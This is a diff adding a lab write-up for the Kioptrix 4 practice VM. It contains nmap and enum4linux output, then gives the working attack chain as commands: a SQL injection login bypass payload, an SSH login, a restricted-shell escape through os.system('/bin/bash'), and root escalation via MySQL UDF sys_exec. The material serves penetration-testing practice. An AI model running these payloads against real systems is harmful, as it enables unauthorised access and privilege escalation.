@@ -1,0 +1,98 @@
+4. Kioptrix 4
+Vulnerability : Sql Injection on login page
+Priv-Escalation : Mysql running under root thus attempted command execution through MySQL UDF or User Defined Function.
+
+Nmap Scan : 
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
+|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
+80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Site doesn't have a title (text/html).
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
+MAC Address: 08:00:27:68:A7:75 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 497.102 days (since Mon Sep  5 13:36:51 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=205 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Host script results:
+|_clock-skew: mean: 59m58s, deviation: 0s, median: 59m58s
+| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| Names:
+|   KIOPTRIX4<00>        Flags: <unique><active>
+|   KIOPTRIX4<03>        Flags: <unique><active>
+|   KIOPTRIX4<20>        Flags: <unique><active>
+|   WORKGROUP<1e>        Flags: <group><active>
+|_  WORKGROUP<00>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.28a)
+|   Computer name: Kioptrix4
+|   NetBIOS computer name: 
+|   Domain name: localdomain
+|   FQDN: Kioptrix4.localdomain
+|_  System time: 2018-01-15T10:02:46-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Enum4linux : 
+
+ ======================================================================== 
+|    Users on 192.168.5.104 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================== 
+[I] Found new SID: S-1-5-21-2529228035-991147148-3991031631
+[I] Found new SID: S-1-22-1
+[I] Found new SID: S-1-5-32
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\loneferret (Local User)
+S-1-22-1-1001 Unix User\john (Local User)
+S-1-22-1-1002 Unix User\robert (Local User)
+
+Hack : 
+- On login page, do sql injection using burpsuit. (Username : john(as find above) , password: admin' or 1=1# (Injection))
+Used list for sql injection : https://github.com/apoorv1126/Offensive-Security/blob/master/SQLinjection-logiBypass
+
+- Using the credentials found in above steps, use ssh to connet to the system.
+
+- It is a restricted shell (Kshell), after a search on google to bypass restricted, use the below command to invoke bash shell.
+echo os.system('/bin/bash')  ### We can only run 'echo' command in kshell 
+########### Source for escaping restricted linux shell ###################
+###### https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells ########
+####### https://ud64.com/ask/61/escaping-bypass-from-jail-restricted-linux-shells ##########
+
+- We get the complete shell.
+
+
+Priv-escalation : 
+- Using the below command, we can find that mysql is running root.  
+ps -ef | grep root
+
+- There is no password to connect to mysql, we can check that in /var/www/checklogin.php
+
+- Using the MySQL UDF we can escalate our privilege to root! You can read more about MySQL UDF on below link
+http://bernardodamele.blogspot.fr/2009/01/command-execution-with-mysql-udf.html
+- " lib_mysqludf_sys.so " is needed to execute UDF or system command thus to verify, use the below command
+whereis lib_mysqludf_sys.so
+
+- Connect to mysql 
+mysql -h localhost -u root -p
+
+- Run the following command to add john to the admin group
+mysql> select sys_exec('usermod -a -G admin john');
+
+Your privilage has been escalated.
+
